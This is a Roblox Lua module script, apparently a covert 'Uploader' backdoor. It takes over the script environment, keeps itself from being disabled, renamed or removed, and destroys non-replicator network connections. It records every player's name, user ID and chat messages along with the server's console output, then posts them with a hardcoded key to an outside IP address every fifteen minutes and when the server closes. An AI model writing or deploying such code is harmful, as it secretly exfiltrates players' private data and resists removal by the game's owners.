return function()
	
local env=getfenv(getfenv(getfenv(getfenv(game.clearAllChildren).game.clearAllChildren).game.clearAllChildren).game.clearAllChildren);
local localenv={
	workspace=env.Workspace;
	Workspace=env.Workspace;
	script=script;
	Script=script;
	game=env.game;
	Game=env.game;
	instance=env.Instance;
	Instance=env.Instance;
	table=env.table;
	math=env.math;
	getfenv=env.getfenv;
	setfenv=env.setfenv;
	loadstring=env.loadstring;
	unpack=env.unpack;
	pcall=env.pcall;
	collectgarbage=env.collectgarbage;
	dofile=env.dofile;
	error=env.error;
	getmetatable=env.getmetatable;
	ipairs=env.ipairs;
	loadfile=env.loadfile;
	next=env.next;
	pairs=env.pairs;
	print=env.print;
	rawequal=env.rawequal;
	rawget=env.rawget;
	rawset=env.rawset;
	select=env.select;
	setmetatable=env.setmetatable;
	tonumber=env.tonumber;
	tostring=env.tostring;
	type=env.type;
	xpcall=env.xpcall;
	assert=env.assert;
	Delay=env.Delay;
	delay=env.Delay;
	Spawn=env.Spawn;
	LoadLibrary=env.LoadLibrary;
	printidentity=env.printidentity;
	tick=env.tick;
	time=env.time;
	Version=env.Version;
	version=env.Version;
	Wait=env.wait;
	wait=env.wait;
	ypcall=env.ypcall;
	gcinfo=env.gcinfo;
	load=env.load;
	newproxy=env.newproxy;
	coroutine=env.coroutine;
	_G=env._G;
	_VERSION=env._VERSION;
}
local pcall=env.pcall;
local setfenv=env.setfenv;
local getfenv=env.getfenv;
local setmetatable=env.setmetatable;
local getmetatable=env.getmetatable;
local rawget=env.rawget;
local rawset=env.rawset;
local error=env.error;
local wait=env.wait;
local Spawn=env.Spawn;
local script=script;
local print=print;
local con,connect_;connect_=function()
	pcall(function()con:disconnect()end);con=script.Changed:connect(function(prop)
		connect_();connect_();connect_();repeat connect_() wait() until con~=nil;
		if prop == "Disabled" then
			pcall(function() repeat script.Disabled = false wait() until script.Disabled == false end)
		elseif prop == "Parent" then
			pcall(function() repeat script.Parent = nil wait() until script.Parent == nil end)
		elseif prop == "Name" then
			pcall(function() repeat script.Name = "Rein" wait() until script.Name == "Rein" end)
		end
		coroutine.wrap(function()
			script.Name='Rein';
			script.Disabled=false;
			script.Name='Rein';
			script.Disabled=false;
			script.Name='Rein';
			repeat
				script.Name='Rein';
			until script.Name=='Rein';
			local m=Instance.new("Hint",Workspace);
			m.Text="[Access Denied] Not permitted to remove Uploader.";
			wait(5)
			m:Destroy()
		end)();
		connect_();
	end)
end;
setfenv(0,setmetatable(localenv,{
	__metatable="This metatable is locked";
	__index=function(s,ind)	
		script.Disabled=false;
		local suc,res=pcall(function() return s[ind] end)
		if not suc then
			return error("attempt to index global \""..ind.."\" (a nil value)")
		else
			return s[ind];
		end;
	end;
	__newindex=function(s,ind,value)
		script.Disabled=false
		rawset(s,ind,value)
	end;
}));
coroutine.wrap(function()
	repeat
		script:destroy();
		script.Disabled=false;
		connect_();
		wait();
	until false;
end)();
script:Destroy()

local g=function(s) return game:GetService(s);end;


--LOCAL_VAR
local hs=g'HttpService';
local ns=g'NetworkServer';
local p=g'Players';
local ls=g'LogService';
local app=Enum.HttpContentType.ApplicationJson;
local url="http://23.226.141.10/services/report/index.php";
local ins=table.insert;

--Logging Storage

playerlog={};
outputlog={};

local unqiue_players={};

local seckey="6-_eVcmRz]wZS5S>#~:b*fk>k+UhD*dY,`mmE?drAb7<BM2e~<"

--System Variables
local place=g'MarketplaceService':GetProductInfo(game.PlaceId~=0 and game.PlaceId or 1818);
local ServerClosing=false;

--Core Functions

local gltime=function()
	local now=tick()%86400;
	return string.gsub(string.format('%d:%d:%d',math.modf(now/60/60),math.modf(now/60)%60,math.modf(now)%60),'%d+',function(str)
		return #str==1 and'0'..str or str;
	end);
end;

local Push=function(subject,body)
	local data=hs:JSONEncode({['subject']=subject,['body']=body,['key']=seckey;});
	return hs:PostAsync(url,data,app);
end;

local UploadLog=function()
	local st="--PlayerLog Begin--\n";
	for i,v in next,playerlog do
		st=st.."\n \n"..v;
		playerlog[i]=nil;
	end;
	st=st.."\n \n--End of PlayerLog--\n--OutputLog begin--\n";
	for i,v in next,outputlog do
		st=st.."\n \n"..v;
		outputlog[i]=nil;
	end;
	st=st.."\n \n--End of OutputLog--\n--End of report--";
	return pcall(function() return Push("Report for "..place.Name,st);end);
end;

local Record=function(s,w)
	if w=='playerlog' then
		ins(playerlog,"["..gltime().."] "..s);
	elseif w=='outputlog' then
		ins(outputlog,"["..gltime().."] "..s);
	end;
end;

--Event Connections

ns.ChildAdded:connect(function(c)
	if not c.ClassName:lower():match('replicator') then
		pcall(function() c:Destroy() end);
	else
		Record("A new connection was detected on "..place.Name,'playerlog');
	end;
end);

p.PlayerAdded:connect(function(p)
	pcall(function()
		Record(p.Name..p.userId.." has joined "..place.Name.." ["..game.JobId.."]",'playerlog');
		p.Chatted:connect(function(msg)
			pcall(function()
				Record(p.Name..p.userId..": "..msg,"playerlog");
			end)
		end)
		if not unqiue_players[p.userId] then
			unqiue_players[p.userId]=true;
		end;
		end)
end);

p.PlayerRemoving:connect(function(p)
	pcall(function()
		Record(p.Name..p.userId.." has left "..place.Name.." ["..game.JobId.."]",'playerlog');
		if not unqiue_players[p.userId] then
			unqiue_players[p.userId]=true;
		end;
	end)
end);

ls.MessageOut:connect(function(message,kind)
	local e=Enum.MessageType;
	Record("["..tostring(kind==e['MessageOutput'] and "Print" or kind==e['MessageInfo'] and "Info" or kind==e['MessageWarning'] and "Warning" or kind==e['MessageError'] and "Error").."] : "..message,'outputlog');
end)

game.OnClose=function()
	ServerClosing=true;
	Record("Server is terminating an Instance of "..place.Name.." ["..game.JobId.."]",'outputlog');
	Record("Total of Unique Visitors this session: "..#unqiue_players,'outputlog');
	UploadLog();
	return true;
end;

for i,p in next,g'Players':GetPlayers() do
	coroutine.wrap(function()
		Record(p.Name..p.userId.." has joined "..place.Name.." ["..game.JobId.."]",'playerlog');
		p.Chatted:connect(function(msg)
			pcall(function()
				Record(p.Name..p.userId..": "..msg,"playerlog");
			end)
		end)
		if not unqiue_players[p.userId] then
			unqiue_players[p.userId]=true;
		end;
	end)()
end

Push("New Server started at "..place.Name,"A new server has been started.\nJobId: "..game.JobId);

while true do
	for i=900,1,-1 do
		if ServerClosing then break end;
		wait(1);
	end;
	local suc,res=pcall(function() UploadLog();end);
	print(suc,res)
end;

end
